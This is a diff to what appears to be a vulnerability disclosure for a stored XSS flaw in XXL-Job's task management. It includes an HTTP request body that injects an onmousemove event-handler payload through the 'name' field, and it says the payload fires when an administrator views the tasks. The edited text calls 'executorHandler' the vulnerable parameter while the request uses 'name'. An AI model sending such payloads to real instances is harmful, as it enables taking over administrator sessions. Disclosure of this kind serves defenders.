@@ -2,7 +2,7 @@
 
 
 
-![image-20260715233455491](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715233455491.png)
+![image-20260715233455491](https://raw.githubusercontent.com/hhhh333/CVE/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715233455491.png)
 
 create a regular user account and select the options for the generic executor Sample (xxl-job-executor-sample) and the AI executor Sample (xxl-job-executor-sample-ai)
 
@@ -10,19 +10,19 @@ Log in to a regular user account -> Add task management
 
 Although `XssUtil` performs XSS filtering, it does not perform regular expression matching on event handlers such as `oncopy` and `onmousemove`, resulting in the triggering of XSS vulnerabilities.
 
-![image-20260715234747279](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715234747279.png)
+![image-20260715234747279](https://raw.githubusercontent.com/hhhh333/CVE/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715234747279.png)
 
-The `name` parameter has an XSS vulnerability
+The `executorHandler` parameter has an XSS vulnerability
 
-![image-20260717152236340](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260717152236340.png)
+![image-20260717152236340](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152236340.png)
 
 insert path
 
-![image-20260715235633636](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715235633636.png)
+![image-20260715235633636](https://raw.githubusercontent.com/hhhh333/CVE/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715235633636.png)
 
 Parameters in the xxljobinfo class
 
-![image-20260717152337416](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260717152337416.png)
+![image-20260717152337416](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152337416.png)
 
 
 
@@ -49,10 +49,10 @@ Priority: u=0
 jobGroup=1&name=%22%3E%3Ca+onmousemove%3Dalert(%22XSS%22)%3Exss&author=1&alarmEmail=&scheduleType=CRON&scheduleConf=0%2F1+*+*+*+*+%3F&cronGen_display=0%2F1+*+*+*+*+%3F&schedule_conf_CRON=0%2F1+*+*+*+*+%3F&schedule_conf_FIX_RATE=&schedule_conf_FIX_DELAY=&executorHandler=a111&executorParam=&executorRouteStrategy=FIRST&childJobId=&misfireStrategy=DO_NOTHING&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&id=14
 ```
 
-![image-20260717152422195](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260717152422195.png)
+![image-20260717152422195](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152422195.png)
 
 When the administrator views task management, malicious code is executed
 
-![image-20260717152458530](C:/Users/86133/AppData/Roaming/Typora/typora-user-images/image-20260717152458530.png)
+![image-20260717152458530](https://github.com/hhhh333/CVE/blob/picture-1/image-20260717152458530.png)
 
 The malicious code is executed successfully.
